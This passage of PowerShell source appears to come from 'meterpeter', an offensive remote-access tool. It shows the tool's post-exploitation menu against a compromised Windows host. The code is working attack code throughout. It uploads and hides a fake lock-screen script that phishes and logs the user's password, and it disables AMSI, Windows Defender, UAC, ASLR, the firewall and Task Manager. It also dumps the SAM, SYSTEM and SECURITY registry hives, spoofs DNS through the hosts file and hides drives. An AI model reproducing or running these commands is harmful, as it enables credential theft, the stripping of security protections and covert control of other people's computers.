          $Command = $Null;
          $Upload = $False; 
        }
      }
      If($choise -ieq "CredPhi" -or $choise -ieq "Creds")
      {
        write-host "`n   Requirements" -ForegroundColor Yellow;
        write-host "   ------------";
        write-host "   This Module will allow attacker to Lock Target WorkStation and request";
        write-host "   a valid UserAccount password to UnLock it, While in background it stores ";
        write-host "   the credentials to a remote logfile under `$env:tmp folder for later review.";
        write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
        write-host "   -------     -----------                  ------";
        write-host "   OldBox      Phish for remote creds       Client:User|Admin - Privs required";
        write-host "   NewBox      Phish for remote creds       Client:User|Admin - Privs required";
        write-host "   ReadLog     Read phishing logFile        Client:User  - Privileges required";
        write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Creds> " -NoNewline -ForeGroundColor Green;
        $cred_choise = Read-Host;
        If($cred_choise -ieq "OldBox" -or $cred_choise -ieq "old")
        {
          $name = "CredsPhish.ps1";
          $File = "$Bin$name"
          $timestamp = Get-date -DisplayHint Time;
          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;
          write-host " [$timestamp] Waiting for valid credentials ✔" -ForegroundColor Yellow;Start-Sleep -Seconds 2;
          If(([System.IO.File]::Exists("$File")))
          {
            ## Write Local script (CredsPhish.ps1) to Remote-Host $env:tmp
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            ## Use powershell -version 2 in VBS trigger IF available
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -version 2 -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R PoWeRsHeLl -Exec Bypass -Win 1 -File %tmp%\CredsPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $Upload = $True;
            $Phishing = $True;
          }else{
            ## Local File { CredsPhish.ps1 } not found .
            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
            Write-Host "   ------     ----------";
            Write-Host "   Not Found  $File" -ForeGroundColor red;
            $File = $Null;
            $Command = $Null;
            $Upload = $False;
          }
        }
        If($cred_choise -ieq "NewBox" -or $cred_choise -ieq "new")
        {
          $name = "NewPhish.ps1";
          $File = "$Bin$name"
          $timestamp = Get-date -DisplayHint Time;
          write-host " Phishing for Remote Credentials (logon)" -ForegroundColor Blue -BackgroundColor White;
          write-host " [$timestamp] Waiting for valid credentials ✔" -ForegroundColor Yellow;Start-Sleep -Seconds 2;
          If(([System.IO.File]::Exists("$File")))
          {
            ## Write Local script (NewPhish.ps1) to Remote-Host $env:tmp
            $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
            $FileBytes = "($FileBytes)";
            $File = $File.Split('\')[-1];
            $File = $File.Split('/')[-1];
            ## Use powershell -version 2 in VBS trigger IF available
            $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Get-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2 `> test.log;If(Get-Content test.log|Select-String `"Enabled`"){`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;remove-Item test.log -Force;cmd /R %tmp%\CredsPhish.vbs}}else{`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `$env:tmp\CredsPhish.vbs;echo 'objShell.Run `"cmd /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\NewPhish.ps1`", 0, True' `>`> `$env:tmp\CredsPhish.vbs;cmd /R %tmp%\CredsPhish.vbs}";
            $Command = $Command -replace "#","$File";
            $Command = $Command -replace "@","$FileBytes";
            $NewPhishing = $True;
            $Upload = $True;
          }else{
            ## Local File { NewPhish.ps1 } not found .
            Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
            Write-Host "   ------     ----------";
            Write-Host "   Not Found  $File" -ForeGroundColor red;
            $File = $Null;
            $Command = $Null;
            $Upload = $False;
          }
        }
        If($cred_choise -ieq "ReadLog" -or $cred_choise -ieq "ReadLog")
        {
          write-host " Read Remote-Host Credential LogFile" -ForeGroundColor blue -BackGroundColor white;Start-Sleep -Seconds 1;write-host "`n";
          $Command = "If(([System.IO.File]::Exists(`"`$env:tmp\CredsPhish.log`"))){Get-Content `$env:tmp\CredsPhish.log `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force;Remove-Item `$env:tmp\NewPhish.ps1 -Force}else{echo `"   [i] Not Found: `$env:tmp\CredsPhish.log`" `> rtf.txt;Get-Content rtf.txt;Remove-Item rtf.txt -Force;Remove-Item `$env:tmp\CredsPhish.ps1 -Force;Remove-Item `$env:tmp\CredsPhish.log -Force;Remove-Item `$env:tmp\CredsPhish.vbs -Force;Remove-Item `$env:tmp\NewPhish.ps1 -Force}";
        }
        If($cred_choise -ieq "Return" -or $cred_choise -ieq "return" -or $cred_choise -ieq "cls" -or $cred_choise -ieq "Modules" -or $cred_choise -ieq "modules" -or $cred_choise -ieq "clear")
        {
          $choise = $Null;
          $Command = $Null;
        }
        $cred_choise = $Null;
      }
      If($choise -ieq "AMSIset" -or $choise -ieq "amsi")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable AMSI (regedit)          Client:User OR ADMIN - Privs Required";
        write-host "   Enable    Enable  AMSI (regedit)          Client:User OR ADMIN - Privs Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Amsi> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          ## HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender -value DisableAntiSpyware 1 (dword32) | Set-MpPreference -DisableRealtimeMonitoring $True
          write-host " Disable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -value 1 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -value 0 -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Enable Remote-Host AMSI (Client:User OR Admin)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Remove-ItemProperty -path 'HKCU:\Software\Microsoft\Windows Script\Settings' -Name 'AmsiEnable' -Force;Get-Item -path `"HKCU:\SOFTWARE\Microsoft\Windows Script\Settings`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "UACSet" -or $choise -ieq "uac")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable Remote UAC              Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote UAC               Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Uac> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Turn OFF Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 0 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Turn ON Remote-Host UAC .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' -value 1 -Force;Get-ItemProperty -path 'HKLM:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'EnableLUA' | select-Object EnableLUA,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "ASLRSet" -or $choise -ieq "aslr")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable ASLR (regedit)          Client:ADMIN - Privileges Required";
        write-host "   Enable    Enable  ASLR (regedit)          Client:ADMIN - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Aslr> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Disable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 0 -Force;echo `"   [i] Restart Remote-Host to disable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Enable Remote-Host ASLR (Windows Defender)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management' -Name 'MoveImages' -value 1 -Force;echo `"   [i] Restart Remote-Host to Enable Windows Defender ASLR ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
        $Command = $Null;
        $choise_two = $Null;
        }
      }      
      If($choise -ieq "TaskMan" -or $choise -ieq "task")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable Remote TaskManager      Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote TaskManager       Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:TaskManager> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Turn OFF Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\policies\system /v DisableTaskMgr /t REG_DWORD /d 1 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Turn ON Remote-Host Task Manager .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' | select-Object DisableTaskMgr,PSchildName,PSDrive,PSProvider `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise -ieq "Return" -or $choice -ieq "return" -or $choise -ieq "cls" -or $choise -ieq "Modules" -or $choise -ieq "modules" -or $choise -ieq "clear")
        {
        $choise = $Null;
        $Command = $Null;
        }
      }
      If($choise -ieq "Firewall" -or $choise -ieq "firewall")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Check     Review Firewall Settings        Client:User  - Privileges Required";
        write-host "   Disable   Disable Remote Firewall         Client:Admin - Privileges Required";
        write-host "   Enable    Enable Remote Firewall          Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Firewall> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Check" -or $choise_two -ieq "check")
        {
          write-host " Review Remote Firewall Settings (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "cmd /R netsh advfirewall show allprofiles `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve firewall settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Disable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state off;echo `"   [i] Remote Firewall Disable (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Enable Remote-Host Firewall (allprofiles)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R netsh advfirewall set allprofiles state on;echo `"   [i] Remote Firewall Enabled (allprofile) ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "Defender" -or $choise -ieq "defender")
      {
        write-host "`n   Requirements" -ForegroundColor Yellow;
        write-host "   ------------";
        write-host "   Attacker needs to restart target system for the changes take effect";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Disable windows defender        Client:Admin - Privileges Required";
        write-host "   Enable    Enable  windows defender        Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Defender> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Turn OFF Windows Defender .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Set-ItemProperty -Path `"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender`" -Name `"DisableAntiSpyware`" -Type DWord -Value 1 -Force;Get-ItemProperty -path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware'|Select-Object PSchildName,DisableAntiSpyware|Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Turn ON Windows Defender .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Remove-ItemProperty -Path `"HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender`" -Name `"DisableAntiSpyware`" -ErrorAction SilentlyContinue;echo `"   [i] Windows Defender Active ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise_two = $Null;
      }
      If($choise -ieq "DumpSAM" -or $choise -ieq "sam")
      {
        write-host " Dump Remote-Host SAM/SYSTEM/SECURITY Remote Credentials." -ForegroundColor Blue -BackgroundColor White;
        write-host " [sam|system|security] Remote Dump Directory: '`$env:tmp'" -ForeGroundColor yellow;write-host "`n`n";Start-Sleep -Seconds 2;
        $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg save hklm\system system;cmd /R reg save hklm\sam sam;cmd /R reg save hklm\security security;dir `$env:tmp `> `$env:localappdata\dellog.txt;Get-content `$env:localappdata\dellog.txt;Remove-Item `$env:localappdata\dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";       
      }
      If($choise -ieq "Dnspoof" -or $choise -ieq "dns")
      {
        write-host "`n   Warnning" -ForegroundColor Yellow;
        write-host "   --------";
        write-host "   The First time 'Spoof' module its used, it will backup";
        write-host "   the real hosts file (hosts-backup) there for its importante";
        write-host "   to allways 'Default' the hosts file before using 'Spoof' again.";
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Check     Review hosts File               Client:User  - Privileges Required";
        write-host "   Spoof     Add Entrys to hosts             Client:Admin - Privileges Required";
        write-host "   Default   Defaults the hosts File         Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Dns> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Check" -or $choise_two -ieq "check")
        {
          write-host " Review hosts File Settings .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "Get-Content `$env:windir\System32\drivers\etc\hosts `> dellog.txt;`$check_tasks = Get-content dellog.txt;If(-not (`$check_tasks)){echo `"   [i] meterpeter Failed to retrieve: $Remote_Host hosts file ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Spoof" -or $choise_two -ieq "spoof")
        {
          write-host " - IpAddr to Redirect: " -NoNewline;
          $Ip_spoof = Read-Host;
          write-host " - Domain to be Redirected: " -NoNewline;
          $Domain_spoof = Read-Host;
          If(-not($Ip_spoof)){$Ip_spoof = "$localIpAddress"}
          If(-not($Domain_spoof)){$Domain_spoof = "www.google.com"}
          ## Copy-Item -Path '$env:windir\system32\Drivers\etc\hosts' -Destination '%SYSTEMROOT%\system32\Drivers\etc\hosts-backup' -Force
          write-host " Redirecting Domains Using hosts File (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;
          write-host " Redirect Domain: $Domain_spoof TO IPADDR: $Ip_spoof" -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Copy-Item -Path `$env:windir\system32\Drivers\etc\hosts -Destination `$env:windir\system32\Drivers\etc\hosts-backup -Force;Add-Content `$env:windir\System32\drivers\etc\hosts '$Ip_spoof $Domain_spoof';echo `"   [i] Dns Entry Added to Remote hosts File`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
        }
        If($choise_two -ieq "Default" -or $choise_two -ieq "default")
        {
          write-host " Revert Remote hosts File To Default (Dns Spoofing)." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){Move-Item -Path `$env:windir\system32\Drivers\etc\hosts-backup -Destination `$env:windir\system32\Drivers\etc\hosts -Force;echo `"   [i] Remote hosts File Reverted to Default Settings ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}"; 
        }
        If($choise_two -ieq "Return" -or $choise_two -ieq "return" -or $choise_two -ieq "cls" -or $choise_two -ieq "Modules" -or $choise_two -ieq "modules" -or $choise_two -ieq "clear")
        {
          $Command = $Null;
          $choise_two = $Null;
        }
        $choise = $Null;
        $Ip_spoof = $Null;
        $choise_two = $Null;
        $Domain_spoof = $Null;
      }
      If($choise -ieq "NoDrive" -or $choise -ieq "nodrive")
      {
        write-host "`n`n   Modules   Description                     Remark" -ForegroundColor green;
        write-host "   -------   -----------                     ------";
        write-host "   Disable   Hide Drives from explorer       Client:Admin - Privileges Required";
        write-host "   Enable    Show Drives in Explorer         Client:Admin - Privileges Required";
        write-host "   Return    Return to Server Main Menu" -ForeGroundColor yellow;
        write-host "`n`n :meterpeter:Post:Drives> " -NoNewline -ForeGroundColor Green;
        $choise_two = Read-Host;
        If($choise_two -ieq "Disable" -or $choise_two -ieq "off")
        {
          write-host " Hide All Drives (C:D:E:F:G) From Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
          $Command = "`$bool = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match `"S-1-5-32-544`");If(`$bool){cmd /R reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDrives /t REG_DWORD /d 67108863 /f;Get-ItemProperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\Explorer' -Name 'NoDrives' | select-Object NoDrives,PSchildName,PSDrive,PSProvider | Format-Table -AutoSize `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force;cmd /R taskkill /F /IM explorer.exe;start explorer.exe}else{echo `"   [i] Client Admin Privileges Required (run as administrator)`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force}";
        }
        If($choise_two -ieq "Enable" -or $choise_two -ieq "on")
        {
          write-host " Display All Drives (C:D:E:F:G) In Explorer .." -ForegroundColor Blue -BackgroundColor White;Start-Sleep -Seconds 1;write-host "`n`n";
